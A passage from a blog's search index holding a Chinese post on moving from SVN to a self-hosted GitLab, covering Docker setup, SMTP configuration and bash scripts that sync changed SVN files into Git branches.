<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>你还在用 SVN 吗？</title>
      <link href="/2023/03/25/svn2git/"/>
      <url>/2023/03/25/svn2git/</url>
      
        <content type="html"><![CDATA[<h2 id="搭建-Git-服务器"><a href="#搭建-Git-服务器" class="headerlink" title="搭建 Git 服务器"></a>搭建 Git 服务器</h2><p><a href="../../../ProjectsBak/logs/smplatform_git_commit_push_1680154939.log">smplatform_git_commit_push_1680154939.log</a><br>直接 Docker 拉取 GitLab 镜像，然后运行即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 启动镜像</span><span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--name</span> gitlab <span class="token parameter variable">--hostname</span> <span class="token number">192.168</span>.1.58 <span class="token parameter variable">--restart</span> always  <span class="token parameter variable">-p</span> <span class="token number">6443</span>:443 <span class="token parameter variable">-p</span> <span class="token number">6080</span>:80 <span class="token parameter variable">-p</span> <span class="token number">6022</span>:22 <span class="token parameter variable">-v</span> /f/docker/data/gitlab/config:/etc/gitlab <span class="token parameter variable">-v</span> /f/docker/data/gitlab/logs:/var/log/gitlab <span class="token parameter variable">-v</span> /f/docker/data/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce<span class="token comment"># 登录后台</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> gitlab /bin/bash<span class="token comment"># 查看初始密码</span><span class="token function">cat</span> /etc/gitlab/initial_root_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关闭用户注册，并创建自己的用户，不要用 root 账户直接提代码哟</p><h3 id="安装一些工具"><a href="#安装一些工具" class="headerlink" title="安装一些工具"></a>安装一些工具</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># apt 设置国内镜像源</span><span class="token comment"># 进入 apt 目录</span><span class="token builtin class-name">cd</span> /etc/apt<span class="token comment"># 备份原配置文件</span><span class="token function">mv</span> sources.list sources.list.bak<span class="token comment"># 编辑配置文件</span><span class="token function">vim</span> sources.list<span class="token comment"># 添加国内镜像源</span>deb http://mirrors.aliyun.com/debian/ buster main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster main non-free contribdeb http://mirrors.aliyun.com/debian-security buster/updates maindeb-src http://mirrors.aliyun.com/debian-security buster/updates maindeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib<span class="token comment"># 保存退出</span><span class="token comment"># 更新源</span><span class="token function">apt</span> update<span class="token comment"># 安装工具</span><span class="token comment"># apt install -y git git-svn subversion</span><span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">vim</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="GitLab-设置"><a href="#GitLab-设置" class="headerlink" title="GitLab 设置"></a>GitLab 设置</h3><h4 id="IP-设置"><a href="#IP-设置" class="headerlink" title="IP 设置"></a>IP 设置</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 编辑 gitlab.yml 文件</span><span class="token function">vim</span> /opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml<span class="token comment"># 不好使再编辑这个</span><span class="token function">vim</span> /var/opt/gitlab/gitlab-rails/etc/gitlab.yml<span class="token comment"># 还不好使...那就只能 docker run 的时候加 --hostname 参数了</span><span class="token comment"># 设置 host</span>host: <span class="token number">192.168</span>.1.58<span class="token comment"># 设置 port</span>port: <span class="token number">6080</span>https: <span class="token boolean">false</span><span class="token comment"># 保存退出</span><span class="token comment"># 编辑 gitlab.rb 文件</span><span class="token function">vim</span> /etc/gitlab/gitlab.rb<span class="token comment"># 修改 external_url</span>registry_external_url <span class="token string">'http://192.168.1.58:6080'</span><span class="token comment"># 保存退出</span><span class="token comment"># 重启 gitlab</span>gitlab-ctl restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="发邮件设置"><a href="#发邮件设置" class="headerlink" title="发邮件设置"></a>发邮件设置</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 进入容器</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> gitlab /bin/bash<span class="token comment"># 进入配置文件目录</span><span class="token builtin class-name">cd</span> /etc/gitlab<span class="token comment"># 编辑配置文件</span><span class="token function">vim</span> gitlab.rb<span class="token comment"># 找到下面的配置项，修改为自己的邮箱，这里以配置 QQ 邮箱为发件邮箱为例</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_enable'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_address'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"smtp.qq.com"</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_port'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">465</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_user_name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"你的QQ号@qq.com"</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"QQ邮箱授权码"</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_domain'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"qq.com"</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_authentication'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"login"</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_enable_starttls_auto'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'smtp_tls'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>gitlab_rails<span class="token punctuation">[</span><span class="token string">'gitlab_email_from'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"你的QQ号@qq.com"</span><span class="token comment"># 重新加载配置</span>gitlab-ctl reconfigure<span class="token comment"># 重启 gitlab</span><span class="token comment"># gitlab-ctl restart</span><span class="token comment"># 测试邮件, 进入 console 时用时比较久</span>gitlab-rails consoleNotify.test_email<span class="token punctuation">(</span><span class="token string">'1064833740@qq.com'</span>, <span class="token string">'邮件主题'</span>, <span class="token string">'邮件内容'</span><span class="token punctuation">)</span>.deliver_now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><h3 id="更新-SVN-仓库"><a href="#更新-SVN-仓库" class="headerlink" title="更新 SVN 仓库"></a>更新 SVN 仓库</h3><p>更新 SVN 代码，并输出更新文件列表</p><p>update_svn.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># sh update_svn.sh /d/ProjectsBak/Singularity /d/ProjectsBak/output.txt</span><span class="token comment"># 获取前一天的日期 yyyy-MM-dd</span><span class="token assign-left variable">startday</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token parameter variable">-d</span> <span class="token string">"yesterday"</span> +%Y-%m-%d<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token variable">$startday</span><span class="token comment"># 读取命令行参数中的项目路径</span><span class="token assign-left variable">repodir</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">outputfile</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token assign-left variable">filename</span><span class="token operator">=</span>/d/tmp.txt<span class="token comment"># svn 更新代码</span><span class="token builtin class-name">echo</span> <span class="token string">"更新代码: svn update <span class="token variable">$repodir</span>"</span>svn update <span class="token variable">$repodir</span><span class="token comment"># 命令行中是否有第三个参数</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$3</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token comment"># 有第三个参数，使用第三个参数作为日期</span>  <span class="token assign-left variable">startday</span><span class="token operator">=</span><span class="token variable">$3</span><span class="token keyword">else</span>  <span class="token builtin class-name">echo</span> <span class="token string">"未指定日期，使用前一天的日期: <span class="token variable">$startday</span>"</span><span class="token keyword">fi</span><span class="token comment"># 一段时间内提交的文件汇总</span><span class="token builtin class-name">echo</span> <span class="token string">"一段时间内提交的文件汇总: svn diff --summarize -r {<span class="token variable">$startday</span>}:HEAD <span class="token variable">$repodir</span> | awk '/^[ADM]/{printf "</span>%s %s<span class="token punctuation">\</span>n<span class="token string">", substr(<span class="token variable">$1</span>,1,1), <span class="token variable">$2</span>}' &gt; <span class="token variable">$filename</span>"</span>svn <span class="token function">diff</span> <span class="token parameter variable">--summarize</span> <span class="token parameter variable">-r</span> <span class="token punctuation">{</span><span class="token variable">$startday</span><span class="token punctuation">}</span>:HEAD <span class="token variable">$repodir</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/^[ADM]/{printf "%s %s\n", substr($1,1,1), $2}'</span> <span class="token operator">&gt;</span> <span class="token variable">$filename</span><span class="token comment"># 将 windows 盘符 替换为 linux 路径</span><span class="token builtin class-name">echo</span> <span class="token string">"将 windows 盘符 替换为 linux 路径: sed -i -E 's/([a-zA-Z]):/\/<span class="token entity" title="\1">\1</span>/g' <span class="token variable">$filename</span>"</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-E</span> <span class="token string">'s/([a-zA-Z]):/\/\1/g'</span> <span class="token variable">$filename</span><span class="token comment"># 将 windows 路径分隔符替换为 linux 路径分隔符</span><span class="token builtin class-name">echo</span> <span class="token string">"将 windows 路径分隔符替换为 linux 路径分隔符: sed -i -E 's/<span class="token entity" title="\\">\\</span>/\//g' <span class="token variable">$filename</span>"</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-E</span> <span class="token string">'s/\\/\//g'</span> <span class="token variable">$filename</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$outputfile</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">"删除旧文件: <span class="token variable">$outputfile</span>"</span>  <span class="token function">rm</span> <span class="token string">"<span class="token variable">$outputfile</span>"</span><span class="token keyword">fi</span><span class="token comment"># 过滤出文件</span><span class="token builtin class-name">echo</span> <span class="token string">'排除所有目录变更...'</span><span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span>  <span class="token comment"># 使用空格分隔行，取第二列作为路径</span>  <span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $line <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $2}'</span><span class="token variable">)</span></span>  <span class="token comment"># 判断路径是否为文件</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$line</span> <span class="token operator">==</span> D* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token comment"># 删除的文件不存在，无法判断，直接保留操作记录</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$line</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$outputfile</span>  <span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token variable">$path</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token comment"># 保留文件操作记录</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$line</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$outputfile</span>  <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token variable">$filename</span><span class="token builtin class-name">echo</span> <span class="token string">"输出文件: <span class="token variable">$outputfile</span>"</span><span class="token comment"># 删除临时文件</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$filename</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">"删除临时文件: <span class="token variable">$filename</span>"</span>  <span class="token function">rm</span> <span class="token string">"<span class="token variable">$filename</span>"</span><span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="准备提交资源"><a href="#准备提交资源" class="headerlink" title="准备提交资源"></a>准备提交资源</h3><p>git_pull_copy_resources.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># sh git_pull_copy_resources.sh /f/CodeRepo/Singularity /d/ProjectsBak/output.txt</span><span class="token comment"># 设置git项目目录</span><span class="token assign-left variable">git_project</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">project_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">basename</span> $git_project<span class="token variable">)</span></span><span class="token comment"># 更新文件列表文件路径</span><span class="token assign-left variable">update_list_file</span><span class="token operator">=</span><span class="token variable">$2</span><span class="token comment"># 命令行中是否有第三个参数</span><span class="token assign-left variable">dir_struct</span><span class="token operator">=</span>module_branch<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$3</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token comment"># 有第三个参数，使用第三个参数作为目录结构</span>  <span class="token assign-left variable">dir_struct</span><span class="token operator">=</span><span class="token variable">$3</span>  <span class="token builtin class-name">echo</span> <span class="token string">"目录结构为: <span class="token variable">$dir_struct</span>"</span><span class="token keyword">else</span>  <span class="token builtin class-name">echo</span> <span class="token string">"未指定目录结构，默认为: <span class="token variable">$dir_struct</span>"</span><span class="token keyword">fi</span><span class="token comment"># svn 与 git 项目映射文件</span><span class="token assign-left variable">dicfile</span><span class="token operator">=</span><span class="token variable">$git_project</span>/svn_git_map.properties<span class="token comment"># 模块数组</span><span class="token assign-left variable">models</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 需要特殊处理的模块数组</span><span class="token assign-left variable">special_models</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 分支文件夹</span><span class="token assign-left variable">branchs_dir</span><span class="token operator">=</span><span class="token variable">$git_project</span>/.branches<span class="token comment"># 分支文件夹若存在则删除重建</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-d</span> <span class="token variable">$branchs_dir</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token variable">$branchs_dir</span><span class="token keyword">fi</span><span class="token builtin class-name">echo</span> <span class="token string">"创建临时分支目录: <span class="token variable">$branchs_dir</span>"</span><span class="token function">mkdir</span> <span class="token variable">$branchs_dir</span><span class="token comment"># 切换到项目目录，并更新</span><span class="token builtin class-name">echo</span> <span class="token string">"切换到项目目录，并更新分支信息: cd <span class="token variable">$git_project</span> &amp;&amp; git fetch"</span><span class="token builtin class-name">cd</span> <span class="token variable">$git_project</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> fetch<span class="token comment"># 切换到 main 分支并更新分支</span><span class="token builtin class-name">echo</span> <span class="token string">"切换到 main 分支并更新分支: git checkout main &amp;&amp; git pull"</span><span class="token function">git</span> checkout main <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> pull<span class="token comment"># 定义映射字典</span><span class="token builtin class-name">echo</span> <span class="token string">"定义映射字典: declare -A map_dict"</span><span class="token builtin class-name">declare</span> <span class="token parameter variable">-A</span> map_dict<span class="token comment"># 读取映射配置到字典, 顺便提取出涉及的分支列表</span><span class="token builtin class-name">echo</span> <span class="token string">"读取映射配置到字典并提取涉及的分支列表"</span><span class="token assign-left variable">start_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span><span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token comment"># 如果以 '#' 开头，就跳过此次循环</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$line</span> <span class="token operator">==</span> <span class="token punctuation">\</span>#* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">continue</span>  <span class="token keyword">fi</span>  <span class="token comment"># 将每行按照等号拆分成key和value</span>  <span class="token assign-left variable">key</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $line <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-f1</span> <span class="token parameter variable">-d</span><span class="token operator">=</span><span class="token variable">)</span></span>  <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $line <span class="token operator">|</span> <span class="token function">cut</span> <span class="token parameter variable">-f2</span> <span class="token parameter variable">-d</span><span class="token operator">=</span><span class="token variable">)</span></span>  <span class="token comment"># echo "$key = $value"</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$key</span> <span class="token operator">==</span> *_* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token assign-left variable">model</span><span class="token operator">=</span><span class="token variable">${key<span class="token operator">%</span>_*}</span>    <span class="token comment"># 如果 dir_struct 为 stable 则 model = key</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$dir_struct</span> <span class="token operator">==</span> <span class="token string">"stable"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token assign-left variable">model</span><span class="token operator">=</span><span class="token variable">$key</span>    <span class="token keyword">fi</span>    <span class="token assign-left variable">svn_branch</span><span class="token operator">=</span><span class="token variable">${key<span class="token operator">/</span>$model<span class="token operator">/</span>}</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$model</span> 模块分支1为 <span class="token variable">$svn_branch</span>"</span>    <span class="token assign-left variable">svn_branch</span><span class="token operator">=</span><span class="token variable">${svn_branch<span class="token operator">/</span>_<span class="token operator">/</span>}</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$model</span> 模块分支为 <span class="token variable">$svn_branch</span>"</span>    <span class="token comment"># 判断 $branchs_dir/$svn_branch 是否存在，不存在则创建</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token variable">$branchs_dir</span>/<span class="token variable">$svn_branch</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token builtin class-name">echo</span> <span class="token string">"创建目录: <span class="token variable">$branchs_dir</span>/<span class="token variable">$svn_branch</span>"</span>      <span class="token function">mkdir</span> <span class="token variable">$branchs_dir</span>/<span class="token variable">$svn_branch</span>    <span class="token keyword">fi</span>    <span class="token comment"># 添加到模块数组中</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">" <span class="token variable">${models<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span> "</span> <span class="token operator">=~</span> <span class="token string">" <span class="token variable">${model}</span> "</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token builtin class-name">echo</span> <span class="token string">"涉及模块: <span class="token variable">$model</span>"</span>      <span class="token assign-left variable">models</span><span class="token operator">+=</span><span class="token punctuation">(</span><span class="token string">"<span class="token variable">${model}</span>"</span><span class="token punctuation">)</span>    <span class="token keyword">fi</span>    <span class="token comment"># 添加到特殊处理模块数组中</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">" <span class="token variable">${special_models<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span> "</span> <span class="token operator">=~</span> <span class="token string">" <span class="token variable">${model}</span> "</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token comment"># 添加元素到数组中</span>      <span class="token builtin class-name">echo</span> <span class="token string">"特殊处理模块: <span class="token variable">$model</span>"</span>      <span class="token assign-left variable">special_models</span><span class="token operator">+=</span><span class="token punctuation">(</span><span class="token string">"<span class="token variable">${model}</span>"</span><span class="token punctuation">)</span>    <span class="token keyword">fi</span>    <span class="token comment"># TODO 特殊模块映射处理</span>  <span class="token keyword">else</span>    <span class="token keyword">while</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span>      <span class="token assign-left variable">svn_branch</span><span class="token operator">=</span><span class="token variable">${line<span class="token operator">#</span>*<span class="token operator">/</span>}</span>      <span class="token assign-left variable">svn_branch</span><span class="token operator">=</span><span class="token variable">${svn_branch<span class="token operator">%</span><span class="token operator">/</span>*}</span>      <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$key</span> 模块分支为 <span class="token variable">$svn_branch</span>"</span>      <span class="token comment"># 判断 $branchs_dir/$svn_branch 是否存在，不存在则创建</span>      <span class="token comment"># echo "判断 $branchs_dir/$svn_branch 是否存在，不存在则创建"</span>      <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token variable">$branchs_dir</span>/<span class="token variable">$svn_branch</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"创建目录: <span class="token variable">$branchs_dir</span>/<span class="token variable">$svn_branch</span>"</span>        <span class="token function">mkdir</span> <span class="token variable">$branchs_dir</span>/<span class="token variable">$svn_branch</span>      <span class="token keyword">fi</span>    <span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token function">grep</span> <span class="token parameter variable">-Eo</span> <span class="token string">"<span class="token variable">$value</span>"</span> <span class="token variable">$update_list_file</span> <span class="token operator">|</span> <span class="token function">sort</span> -u<span class="token punctuation">)</span>    <span class="token comment"># 添加到模块数组中</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">" <span class="token variable">${models<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span> "</span> <span class="token operator">=~</span> <span class="token string">" <span class="token variable">${key}</span> "</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token builtin class-name">echo</span> <span class="token string">"涉及模块: <span class="token variable">$key</span>"</span>      <span class="token assign-left variable">models</span><span class="token operator">+=</span><span class="token punctuation">(</span><span class="token string">"<span class="token variable">${key}</span>"</span><span class="token punctuation">)</span>    <span class="token keyword">fi</span>  <span class="token keyword">fi</span>  map_dict<span class="token punctuation">[</span><span class="token string">"<span class="token variable">$key</span>"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$value</span>"</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token variable">$dicfile</span><span class="token comment"># 计算耗时</span><span class="token assign-left variable">end_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"读取映射、提取分支耗时 <span class="token variable"><span class="token variable">$((</span>end_time <span class="token operator">-</span> start_time<span class="token variable">))</span></span> 秒"</span><span class="token builtin class-name">echo</span> <span class="token string">""</span><span class="token builtin class-name">echo</span> <span class="token string">"================================================"</span><span class="token comment"># 读取文本文件 update_list_file 中的每一行变更</span><span class="token comment"># 获取时间戳, 用来计算耗时</span><span class="token assign-left variable">start_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span><span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span>  <span class="token comment"># 截取 line 的第二列，作为文件路径</span>  <span class="token assign-left variable">update_path</span><span class="token operator">=</span><span class="token variable">${line<span class="token operator">#</span>* }</span>  <span class="token comment"># 根据 project_name 截取出模块路径</span>  <span class="token assign-left variable">model_path</span><span class="token operator">=</span><span class="token variable">${update_path<span class="token operator">#</span>*$project_name<span class="token operator">/</span>}</span>  <span class="token comment"># 获取第一个 / 之前的内容作为模块名</span>  <span class="token assign-left variable">model</span><span class="token operator">=</span><span class="token variable">${model_path<span class="token operator">%%</span><span class="token operator">/</span>*}</span>  <span class="token comment"># 如果 special_models 中包含 model, 则跳过</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token string">" <span class="token variable">${special_models<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span> "</span> <span class="token operator">=~</span> <span class="token string">" <span class="token variable">${model}</span> "</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token comment"># TODO 特殊处理</span>    <span class="token builtin class-name">echo</span> <span class="token string">"跳过 <span class="token variable">$model</span> 模块"</span>    <span class="token builtin class-name">continue</span>  <span class="token keyword">fi</span>  <span class="token comment"># 从 model_path 中截取出分支</span>  <span class="token assign-left variable">branch_path</span><span class="token operator">=</span><span class="token variable">${model_path<span class="token operator">#</span>*$model<span class="token operator">/</span>}</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$dir_struct</span> <span class="token operator">==</span> <span class="token string">"stable"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token assign-left variable">tmp</span><span class="token operator">=</span><span class="token variable">$branch_path</span>    <span class="token assign-left variable">branch_path</span><span class="token operator">=</span><span class="token variable">$model_path</span>    <span class="token assign-left variable">model_path</span><span class="token operator">=</span><span class="token variable">$tmp</span>    <span class="token assign-left variable">model</span><span class="token operator">=</span><span class="token variable">${model_path<span class="token operator">%%</span><span class="token operator">/</span>*}</span>  <span class="token keyword">fi</span>  <span class="token comment"># 获取第一个 / 之前的内容作为分支</span>  <span class="token assign-left variable">branch</span><span class="token operator">=</span><span class="token variable">${branch_path<span class="token operator">%%</span><span class="token operator">/</span>*}</span>  <span class="token comment"># echo "模块路径: $model_path"</span>  <span class="token comment"># echo "模块: $model"</span>  <span class="token comment"># echo "分支路径: $branch_path"</span>  <span class="token comment"># echo "分支: $branch"</span>  <span class="token comment"># 从 branch_path 中截取出文件路径</span>  <span class="token assign-left variable">file_path</span><span class="token operator">=</span><span class="token variable">${branch_path<span class="token operator">#</span>*$branch<span class="token operator">/</span>}</span>  <span class="token comment"># 获取第一个 / 之后的内容作为文件路径</span>  <span class="token assign-left variable">file_path</span><span class="token operator">=</span><span class="token variable">${file_path<span class="token operator">#</span>*<span class="token operator">/</span>}</span>  <span class="token comment"># 如果是否以 D 开头, 则是需要删除的文件或目录</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$line</span> <span class="token operator">==</span> D* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token comment"># echo "文件路径: $file_path"</span>    <span class="token assign-left variable">target_path</span><span class="token operator">=</span><span class="token variable">$git_project</span>/<span class="token variable">$model</span>/<span class="token variable">$file_path</span>    <span class="token assign-left variable">delete_list_file</span><span class="token operator">=</span><span class="token variable">$branchs_dir</span>/<span class="token variable">$branch</span>/delete_files.txt    <span class="token comment"># 判断 delete_list_file 是否存在，不存在则创建一个</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token variable">$delete_list_file</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token builtin class-name">echo</span> <span class="token string">"创建文件: <span class="token variable">$delete_list_file</span>"</span>  